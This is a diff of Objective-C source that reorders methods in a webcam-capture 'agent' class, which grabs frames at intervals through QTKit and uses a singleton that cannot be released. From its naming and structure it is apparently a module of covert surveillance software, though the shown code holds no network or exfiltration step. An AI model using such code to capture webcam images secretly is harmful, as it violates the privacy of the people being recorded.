@@ -29,19 +29,58 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
 
 @interface __m_MAgentWebcam (hidden)
 
-- (BOOL)_initSession;
-- (BOOL)_releaseSession;
-- (BOOL)_startSession;
-- (BOOL)_stopSession;
-- (BOOL)_startGrabImageWithFrame: (int)nFrame every: (int)seconds;
 - (void)captureOutput: (QTCaptureOutput *)captureOutput 
   didOutputVideoFrame: (CVImageBufferRef)videoFrame 
      withSampleBuffer: (QTSampleBuffer *)sampleBuffer 
        fromConnection: (QTCaptureConnection *)connection;
 
+- (BOOL)_initSession;
+
+- (BOOL)_startSession;
+- (BOOL)_stopSession;
+
+- (BOOL)_releaseSession;
+
+- (BOOL)_startGrabImageWithFrame: (int)nFrame every: (int)seconds;
+
 @end
 
 @implementation __m_MAgentWebcam (hidden)
+
+- (void)captureOutput: (QTCaptureOutput *)captureOutput 
+  didOutputVideoFrame: (CVImageBufferRef)videoFrame 
+     withSampleBuffer: (QTSampleBuffer *)sampleBuffer 
+       fromConnection: (QTCaptureConnection *)connection
+{  
+  if (videoFrame == nil )
+    return;
+  
+  if (mImageGrabbed == YES)
+    return;
+  
+  @synchronized(self)
+  {
+    CVBufferRetain(videoFrame);
+    mCurrentImageBuffer = videoFrame;
+    mImageGrabbed = YES;
+  }
+}
+
+- (BOOL)_releaseSession
+{
+  [mCaptureDecompressedVideoOutput release];
+  [mCaptureDeviceInput release];
+  [mCaptureSession release];
+  [mDevice close];
+  
+  mImageGrabbed = NO;
+  mCaptureSession = nil;
+  mDevice = nil;
+  mCaptureDeviceInput = nil;
+  mCaptureDecompressedVideoOutput = nil;
+  
+  return YES;
+}
 
 - (BOOL)_initSession
 {
@@ -108,18 +147,12 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
   return YES;
 }
 
-- (BOOL)_releaseSession
+- (BOOL)_stopSession
 {
-  [mCaptureDecompressedVideoOutput release];
-  [mCaptureDeviceInput release];
-  [mCaptureSession release];
-  [mDevice close];
+  [mCaptureSession stopRunning];
   
-  mImageGrabbed = NO;
-  mCaptureSession = nil;
-  mDevice = nil;
-  mCaptureDeviceInput = nil;
-  mCaptureDecompressedVideoOutput = nil;
+  while([mCaptureSession isRunning] == YES) 
+    usleep(1000);
   
   return YES;
 }
@@ -130,16 +163,6 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
   
   if ([mCaptureSession isRunning] == NO) 
     return NO;
-  
-  return YES;
-}
-
-- (BOOL)_stopSession
-{
-  [mCaptureSession stopRunning];
-  
-  while([mCaptureSession isRunning] == YES) 
-    usleep(1000);
   
   return YES;
 }
@@ -254,25 +277,6 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
   return YES;  
 }
 
-- (void)captureOutput: (QTCaptureOutput *)captureOutput 
-  didOutputVideoFrame: (CVImageBufferRef)videoFrame 
-     withSampleBuffer: (QTSampleBuffer *)sampleBuffer 
-       fromConnection: (QTCaptureConnection *)connection
-{  
-  if (videoFrame == nil )
-    return;
-  
-  if (mImageGrabbed == YES)
-    return;
-  
-  @synchronized(self)
-    {
-      CVBufferRetain(videoFrame);
-      mCurrentImageBuffer = videoFrame;
-      mImageGrabbed = YES;
-    }
-}
-
 @end
 
 @implementation __m_MAgentWebcam
@@ -317,25 +321,10 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
   return self;
 }
 
-- (id)retain
-{
-  return self;
-}
-
 - (unsigned)retainCount
 {
   // Denotes an object that cannot be released
   return UINT_MAX;
-}
-
-- (void)release
-{
-  // Do nothing
-}
-
-- (id)autorelease
-{
-  return self;
 }
 
 - (id)init
@@ -364,6 +353,42 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
   return sharedAgentWebcam;
 }
 
+- (void)release
+{
+  // Do nothing
+}
+
+- (id)autorelease
+{
+  return self;
+}
+
+- (id)retain
+{
+  return self;
+}
+
+- (BOOL)stop
+{
+  int internalCounter = 0;
+  
+  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
+  
+  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
+         internalCounter <= MAX_STOP_WAIT_TIME)
+  {
+    internalCounter++;
+    usleep(100000);
+  }
+  
+  return YES;
+}
+
+- (BOOL)resume
+{
+  return YES;
+}
+
 - (void)start
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -385,27 +410,6 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
   [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
   
   [outerPool release];
-}
-
-- (BOOL)stop
-{
-  int internalCounter = 0;
-  
-  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
-  
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
-         internalCounter <= MAX_STOP_WAIT_TIME)
-    {
-      internalCounter++;
-      usleep(100000);
-    }
-  
-  return YES;
-}
-
-- (BOOL)resume
-{
-  return YES;
 }
 
 #pragma mark -
